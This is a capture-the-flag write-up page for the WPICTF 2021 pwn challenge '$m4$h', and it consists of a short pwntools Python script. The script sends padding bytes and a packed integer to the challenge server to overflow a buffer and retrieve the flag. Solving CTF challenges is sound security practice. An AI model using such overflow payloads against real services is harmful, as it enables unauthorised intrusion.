---
layout: load_md
title: The White Circle | Wpictf 2021 | $m4$h Writeup
desc: Check out our writeup for $m4$h for Wpictf 2021 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Wpictf 2021
parent: wpictf_2021
category: pwn
challenge: $m4$h
tags: "pwn, twh"
date: 2021-04-26T00:00:00+00:00
last_modified_at: 2021-04-26T00:00:00+00:00
---



> Solved by : thewhiteh4t

```python
#!/usr/bin/env python3

from pwn import *

host = 'smash184384.wpictf.xyz'
port = 15724

junk = 'A' * 11
num = 923992130

le_num = p32(num, endianness='little')
buffer = junk.encode() + le_num + '\n'.encode()

conn = remote(host, port)
conn.send(buffer)
flag = conn.recvline().decode().split(': ')[1].strip()
print(f'\nFLAG : {flag}\n')
conn.close()
```